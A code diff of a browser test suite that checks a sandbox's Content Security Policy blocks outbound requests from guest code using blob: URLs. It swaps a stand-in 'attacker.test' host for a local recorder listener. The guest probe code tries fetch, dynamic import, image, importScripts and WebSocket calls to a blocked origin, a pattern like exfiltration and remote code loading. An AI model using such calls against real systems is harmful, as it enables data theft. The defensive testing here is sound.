@@ -1,5 +1,6 @@
 import { test, expect, HARNESS, ORIGIN } from './fixture';
 import type { CSPDirectives } from '@src/csp-directives';
+import { useRecorder, wss } from './recorder';
 
 /**
  * Precondition probe for "δ blob-URL files" (docs/research/blob-delivery-probe.md): the host pushes
@@ -31,8 +32,6 @@ const DELTA_CSP: CSPDirectives = {
 const WITH_BLOB = { connectionsAllowed: DELTA_CSP };
 
 // An origin no config allowlists; upgrade-insecure-requests is always on, so match any scheme.
-const ATTACKER = 'https://attacker.test';
-const ATTACKER_PATTERN = /attacker\.test/;
 
 // A 304-byte WOFF2 with one glyph ("A", 4 em wide), generated for this spec with fontTools'
 // FontBuilder. The width tells "font applied" apart from "fallback font".
@@ -524,25 +523,44 @@ test.describe('4. blob: URLs do not cross realms', () => {
 });
 
 // ---- 5: blob: adds no egress --------------------------------------------------------------------
+//
+// Evidence (backlog T5): every attempt targets a listener outside the browser (recorder.ts), which must
+// stay silent; each refusal is the guest's own load outcome and, where the engine raises one, its CSP
+// violation reported on the host (S5; in a worker, Chromium reports all, Firefox fetch and WebSocket only,
+// WebKit none). Positive control: the last test of section 5 sends the same attempts to an allowlisted
+// origin, and every one succeeds and reaches the listener.
 
-async function watchAttacker(context: any): Promise<string[]> {
-    const reached: string[] = [];
-    await context.route(ATTACKER_PATTERN, (route: any) => { reached.push(route.request().url()); return route.fulfill({ body: '' }); });
-    return reached;
-}
+const recorder = useRecorder();
 
 // Guest code that tries every outbound channel it has and logs how each settled.
-const OUTBOUND_ATTEMPTS = `
+const outboundAttempts = (target: string) => `
     const report = (k, v) => console.log('OUTBOUND ' + k + ' ' + v);
-    fetch('${ATTACKER}/fetch').then(() => report('fetch', 'reached'), () => report('fetch', 'refused'));
-    import('${ATTACKER}/module.js').then(() => report('import', 'reached'), () => report('import', 'refused'));
+    fetch('${target}/fetch').then(() => report('fetch', 'reached'), () => report('fetch', 'refused'));
+    import('${target}/module.js').then(() => report('import', 'reached'), () => report('import', 'refused'));
     if (typeof document !== 'undefined') {
-        const i = new Image(); i.onload = () => report('img', 'reached'); i.onerror = () => report('img', 'refused'); i.src = '${ATTACKER}/img';
+        const i = new Image(); i.onload = () => report('img', 'reached'); i.onerror = () => report('img', 'refused'); i.src = '${target}/img.svg';
     } else {
-        try { importScripts('${ATTACKER}/script.js'); report('importScripts', 'reached'); } catch (e) { report('importScripts', 'refused'); }
+        try { importScripts('${target}/script.js'); report('importScripts', 'reached'); } catch (e) { report('importScripts', 'refused'); }
     }
-    try { new WebSocket('wss://attacker.test/ws').onopen = () => report('websocket', 'reached'); } catch (e) {}
+    try { const ws = new WebSocket('${wss(target)}/ws'); ws.onopen = () => report('websocket', 'reached'); ws.onerror = () => report('websocket', 'refused'); } catch (e) { report('websocket', 'refused'); }
 `;
+
+// The violations each engine reports on the host for outboundAttempts(target), in iframe or worker mode.
+function outboundViolations(target: string, mode: 'iframe' | 'worker', browserName: string): string[] {
+    const fetch = `connect-src ${target}/fetch`;
+    const websocket = `connect-src ${wss(target)}/ws`;
+    const imported = `script-src-elem ${target}/module.js`;
+    if (mode === 'iframe') return [fetch, websocket, `img-src ${target}/img.svg`, imported].sort();
+    if (browserName === 'chromium') return [fetch, websocket, imported, `script-src-elem ${target}/script.js`].sort();
+    if (browserName === 'firefox') return [fetch, websocket].sort();
+    return []; // WebKit raises no violations in workers
+}
+
+async function reportedViolations(sandbox: any): Promise<string[]> {
+    await sandbox.page.waitForTimeout(300); // violation events are queued as tasks, then cross the port
+    const all: { directive: string; blockedURI: string }[] = await sandbox.violations();
+    return [...new Set(all.map(v => `${v.directive} ${v.blockedURI}`))].sort();
+}
 
 // ---- 5a: no 'self' in the guest policy (backlog S14) ---------------------------------------------
 //
@@ -557,8 +575,9 @@ const HOST_SCRIPT = `${ORIGIN}/playground/test-assets/script.js`;
 
 // Guest markup that reads its own policy, loads scripts from a non-allowlisted origin three ways (and,
 // with `withHost`, one from the host origin), and logs how each settled plus the script-src
-// violations it saw, once the port is up (the shipping config has no execute()).
-const scriptSourceProbe = (withHost: boolean) => `<script>
+// violations it saw, once the port is up (the shipping config has no execute()). A script that
+// reached the listener would run and count itself in __recorderRan.
+const scriptSourceProbe = (target: string, withHost: boolean) => `<script>
     const r = { violations: [] };
     addEventListener('securitypolicyviolation', e => r.violations.push(e.effectiveDirective + ' ' + new URL(e.blockedURI).pathname));
     const load = (url, module) => new Promise(res => {
@@ -569,26 +588,14 @@ const scriptSourceProbe = (withHost: boolean) => `<script>
     });
     (async () => {
         r.policy = document.querySelector('meta[http-equiv="Content-Security-Policy"]').content;
-        r.classic = await load('${ATTACKER}/classic.js');
-        r.module = await load('${ATTACKER}/module.js', true);
-        r.dynamicImport = await import('${ATTACKER}/import.js').then(() => 'load', () => 'refused');
+        r.classic = await load('${target}/classic.js');
+        r.module = await load('${target}/module.js', true);
+        r.dynamicImport = await import('${target}/import.js').then(() => 'load', () => 'refused');
         ${withHost ? `r.hostOrigin = await load('${HOST_SCRIPT}');` : ''}
-        r.ran = globalThis.__externalRan || 0;
+        r.ran = globalThis.__recorderRan || 0;
         setTimeout(() => { r.violations.sort(); console.log('SCRIPT_SOURCES ' + JSON.stringify(r)); }, 800);
     })();
 </script>`;
-
-// Serves ATTACKER with a script that counts its runs; returns what was reached. In Chromium the
-// route does not reliably see the guest frame's requests, so the CSP violations are the primary
-// evidence and `reached` a secondary one.
-async function routeScripts(context: any): Promise<string[]> {
-    const reached: string[] = [];
-    await context.route(ATTACKER_PATTERN, (route: any) => {
-        reached.push(new URL(route.request().url()).pathname);
-        return route.fulfill({ body: 'globalThis.__externalRan = (globalThis.__externalRan || 0) + 1;', contentType: 'text/javascript', headers: { 'Access-Control-Allow-Origin': '*' } });
-    });
-    return reached;
-}
 
 function collectWarnings(page: any): string[] {
     const warnings: string[] = [];
@@ -596,32 +603,31 @@ function collectWarnings(page: any): string[] {
     return warnings;
 }
 
-async function scriptSourceOutcome(sandbox: any, context: any, withHost: boolean, connectionsAllowed?: CSPDirectives) {
-    const reached = await routeScripts(context);
+async function scriptSourceOutcome(sandbox: any, withHost: boolean, connectionsAllowed?: CSPDirectives) {
     // the shipping configuration: no scriptUnsafe, guest markup only
-    expect(await sandbox.mount({ scriptUnsafe: false, html: scriptSourceProbe(withHost), ...(connectionsAllowed ? { connectionsAllowed } : {}) })).toBe('ready');
+    expect(await sandbox.mount({ scriptUnsafe: false, html: scriptSourceProbe(recorder.blocked, withHost), ...(connectionsAllowed ? { connectionsAllowed } : {}) })).toBe('ready');
     const line: string = await sandbox.waitForLog('SCRIPT_SOURCES ', 8000);
-    return { reached, ...JSON.parse(line.slice('SCRIPT_SOURCES '.length)) };
+    return { reached: recorder.paths('blocked'), ...JSON.parse(line.slice('SCRIPT_SOURCES '.length)) };
 }
 
 const REFUSED_ATTACKER = { classic: 'refused', module: 'refused', dynamicImport: 'refused', ran: 0 };
 const ATTACKER_VIOLATIONS = ['script-src-elem /classic.js', 'script-src-elem /import.js', 'script-src-elem /module.js'];
 
 test.describe("5a. the guest policy never contains 'self'", () => {
-    test('shipping default: no script loads from another origin or the host origin, each refused by script-src', async ({ sandbox, context, page }) => {
+    test('shipping default: no script loads from another origin or the host origin, each refused by script-src', async ({ sandbox, page }) => {
         const warnings = collectWarnings(page);
-        const { policy, violations, ...outcome } = await scriptSourceOutcome(sandbox, context, true);
+        const { policy, violations, ...outcome } = await scriptSourceOutcome(sandbox, true);
         expect(policy.toLowerCase()).not.toContain("'self'");
         expect(outcome).toEqual({ reached: [], ...REFUSED_ATTACKER, hostOrigin: 'refused' });
         expect(violations).toEqual([...ATTACKER_VIOLATIONS, 'script-src-elem /playground/test-assets/script.js'].sort());
         expect(warnings.filter(w => w.includes("'self'"))).toEqual([]);
     });
 
-    test("a configured 'self' is dropped with one warning; the explicit origin stays and other origins are refused", async ({ sandbox, context, page }) => {
+    test("a configured 'self' is dropped with one warning; the explicit origin stays and other origins are refused", async ({ sandbox, page }) => {
         // No host-origin load here: whether the allowlisted http://localhost loads is engine-specific
         // (WebKit upgrades it under upgrade-insecure-requests, research 01), and not what this asserts.
         const warnings = collectWarnings(page);
-        const { policy, violations, ...outcome } = await scriptSourceOutcome(sandbox, context, false, { 'script-src': ["'self'", "'unsafe-inline'", ORIGIN] });
+        const { policy, violations, ...outcome } = await scriptSourceOutcome(sandbox, false, { 'script-src': ["'self'", "'unsafe-inline'", ORIGIN] });
         expect(policy).toContain(`script-src 'unsafe-inline' ${ORIGIN};`);
         expect(policy.toLowerCase()).not.toContain("'self'");
         expect(outcome).toEqual({ reached: [], ...REFUSED_ATTACKER });
@@ -634,23 +640,21 @@ test.describe("5a. the guest policy never contains 'self'", () => {
         ["'self' configured", { 'script-src': ["'SELF'", "'unsafe-inline'"] }],
     ];
     for (const [label, connectionsAllowed] of workerCases) {
-        test(`worker mode, ${label}: importScripts and import() from another origin are refused, nothing reaches the network`, async ({ sandbox, context, page }) => {
-            const reached = await routeScripts(context);
+        test(`worker mode, ${label}: importScripts and import() from another origin are refused, nothing reaches the network`, async ({ sandbox, page }) => {
             const warnings = collectWarnings(page);
             // worker mode has no markup: guest code arrives through execute(), hence scriptUnsafe (the fixture's)
             expect(await sandbox.mount({ mode: 'worker', ...(connectionsAllowed ? { connectionsAllowed } : {}) })).toBe('ready');
             await sandbox.run(`(async () => {
                 const r = {};
-                try { importScripts('${ATTACKER}/imported.js'); r.importScripts = 'load'; } catch (e) { r.importScripts = 'refused'; }
+                try { importScripts('${recorder.blocked}/imported.js'); r.importScripts = 'load'; } catch (e) { r.importScripts = 'refused'; }
                 try { importScripts('${ORIGIN}/playground/test-assets/script.js'); r.hostOrigin = 'load'; } catch (e) { r.hostOrigin = 'refused'; }
-                r.dynamicImport = await import('${ATTACKER}/import.js').then(() => 'load', () => 'refused');
-                r.ran = globalThis.__externalRan || 0;
+                r.dynamicImport = await import('${recorder.blocked}/import.js').then(() => 'load', () => 'refused');
+                r.ran = globalThis.__recorderRan || 0;
                 console.log('WORKER_SOURCES ' + JSON.stringify(r));
             })()`);
             const line = await sandbox.waitForLog('WORKER_SOURCES ', 8000);
             expect(JSON.parse(line.slice('WORKER_SOURCES '.length))).toEqual({ importScripts: 'refused', hostOrigin: 'refused', dynamicImport: 'refused', ran: 0 });
-            await page.waitForTimeout(300);
-            expect(reached).toEqual([]);
+            expect(recorder.paths('blocked')).toEqual([]);
             expect(warnings.filter(w => w.includes(SELF_WARNING))).toHaveLength(connectionsAllowed ? 1 : 0);
         });
     }
@@ -661,41 +665,63 @@ test.describe('5. blob: in the policy adds no egress', () => {
         ['classic blob: script', (src: string) => `const s = document.createElement('script'); s.src = URL.createObjectURL(new Blob([${JSON.stringify(src)}], { type: 'text/javascript' })); document.head.appendChild(s);`],
         ['blob: module', (src: string) => `import(URL.createObjectURL(new Blob([${JSON.stringify(src)}], { type: 'text/javascript' })));`],
     ] as const) {
-        test(`a ${name} runs under the guest's CSP: every outbound channel is refused`, async ({ sandbox, context, page }) => {
-            const reached = await watchAttacker(context);
+        test(`a ${name} runs under the guest's CSP: every outbound channel is refused`, async ({ sandbox, browserName }) => {
             expect(await sandbox.mount(WITH_BLOB)).toBe('ready');
-            await sandbox.run(wrap(OUTBOUND_ATTEMPTS));
-            expect(await sandbox.waitForLog('OUTBOUND fetch ')).toBe('OUTBOUND fetch refused');
-            expect(await sandbox.waitForLog('OUTBOUND import ')).toBe('OUTBOUND import refused');
-            expect(await sandbox.waitForLog('OUTBOUND img ')).toBe('OUTBOUND img refused');
-            await page.waitForTimeout(500);
-            expect((await sandbox.logs()).filter(l => l.endsWith(' reached'))).toEqual([]);
-            expect(reached).toEqual([]);
+            await sandbox.run(wrap(outboundAttempts(recorder.blocked)));
+            for (const channel of ['fetch', 'import', 'img', 'websocket']) {
+                expect(await sandbox.waitForLog(`OUTBOUND ${channel} `)).toBe(`OUTBOUND ${channel} refused`);
+            }
+            expect(await reportedViolations(sandbox)).toEqual(outboundViolations(recorder.blocked, 'iframe', browserName));
+            expect(recorder.hits.filter(hit => hit.server === 'blocked')).toEqual([]);
         });
     }
 
-    test('a blob: stylesheet runs under the guest\'s CSP: its url() to another origin is refused', async ({ sandbox, context, page }) => {
-        const reached = await watchAttacker(context);
+    test('a blob: stylesheet runs under the guest\'s CSP: its url() to another origin is refused', async ({ sandbox }) => {
         expect(await sandbox.mount(WITH_BLOB)).toBe('ready');
         await sandbox.run(`
             const l = document.createElement('link'); l.rel = 'stylesheet';
-            l.href = URL.createObjectURL(new Blob(['body { background-image: url("${ATTACKER}/bg"); } @import url("${ATTACKER}/import.css");'], { type: 'text/css' }));
+            l.href = URL.createObjectURL(new Blob(['@import url("${recorder.blocked}/import.css"); body { background-image: url("${recorder.blocked}/bg.svg"); }'], { type: 'text/css' }));
             document.head.appendChild(l);
         `);
-        await page.waitForTimeout(1000);
-        expect(reached).toEqual([]);
+        expect(await sandbox.waitForViolation('style-src-elem', `${recorder.blocked}/import.css`)).toBeTruthy();
+        expect(recorder.paths('blocked')).toEqual([]);
     });
 
-    test('worker mode: a blob: script pulled in with importScripts runs under the guest\'s CSP', async ({ sandbox, context, page }) => {
-        const reached = await watchAttacker(context);
+    test('worker mode: a blob: script pulled in with importScripts runs under the guest\'s CSP', async ({ sandbox, browserName }) => {
         expect(await sandbox.mount({ mode: 'worker', ...WITH_BLOB })).toBe('ready');
-        await sandbox.run(`importScripts(URL.createObjectURL(new Blob([${JSON.stringify(OUTBOUND_ATTEMPTS)}], { type: 'text/javascript' })));`);
-        expect(await sandbox.waitForLog('OUTBOUND importScripts')).toBe('OUTBOUND importScripts refused');
-        expect(await sandbox.waitForLog('OUTBOUND fetch ')).toBe('OUTBOUND fetch refused');
-        expect(await sandbox.waitForLog('OUTBOUND import ')).toBe('OUTBOUND import refused');
-        await page.waitForTimeout(500);
-        expect((await sandbox.logs()).filter(l => l.endsWith(' reached'))).toEqual([]);
-        expect(reached).toEqual([]);
+        await sandbox.run(`importScripts(URL.createObjectURL(new Blob([${JSON.stringify(outboundAttempts(recorder.blocked))}], { type: 'text/javascript' })));`);
+        for (const channel of ['importScripts', 'fetch', 'import', 'websocket']) {
+            expect(await sandbox.waitForLog(`OUTBOUND ${channel} `)).toBe(`OUTBOUND ${channel} refused`);
+        }
+        expect(await reportedViolations(sandbox)).toEqual(outboundViolations(recorder.blocked, 'worker', browserName));
+        expect(recorder.hits.filter(hit => hit.server === 'blocked')).toEqual([]);
+    });
+
+    test('positive control: the same attempts to an allowlisted origin all succeed and reach the listener, in iframe and worker mode, with no violation', async ({ sandbox }) => {
+        const allowed = recorder.allowed;
+        const connectionsAllowed: CSPDirectives = {
+            ...DELTA_CSP,
+            'script-src': ["'unsafe-inline'", 'blob:', allowed],
+            'style-src': ["'unsafe-inline'", 'blob:', allowed],
+            'img-src': ['blob:', allowed],
+            'connect-src': ['blob:', allowed, wss(allowed)],
+        };
+        const expectedPaths = { iframe: ['/fetch', '/img.svg', '/module.js', '/ws'], worker: ['/fetch', '/module.js', '/script.js', '/ws'] };
+        for (const mode of ['iframe', 'worker'] as const) {
+            recorder.clear();
+            await sandbox.clearLogs();
+            await sandbox.clearViolations();
+            expect(await sandbox.mount({ mode, connectionsAllowed })).toBe('ready');
+            const attempts = JSON.stringify(outboundAttempts(allowed));
+            await sandbox.run(mode === 'iframe'
+                ? `import(URL.createObjectURL(new Blob([${attempts}], { type: 'text/javascript' })));`
+                : `importScripts(URL.createObjectURL(new Blob([${attempts}], { type: 'text/javascript' })));`);
+            for (const channel of mode === 'iframe' ? ['fetch', 'import', 'img', 'websocket'] : ['importScripts', 'fetch', 'import', 'websocket']) {
+                expect(await sandbox.waitForLog(`OUTBOUND ${channel} `), `${mode} ${channel}`).toBe(`OUTBOUND ${channel} reached`);
+            }
+            for (const path of expectedPaths[mode]) await recorder.waitFor('allowed', path);
+            expect(await sandbox.violations()).toEqual([]);
+        }
     });
 
     // A blob: document the guest creates, used as a navigation target.
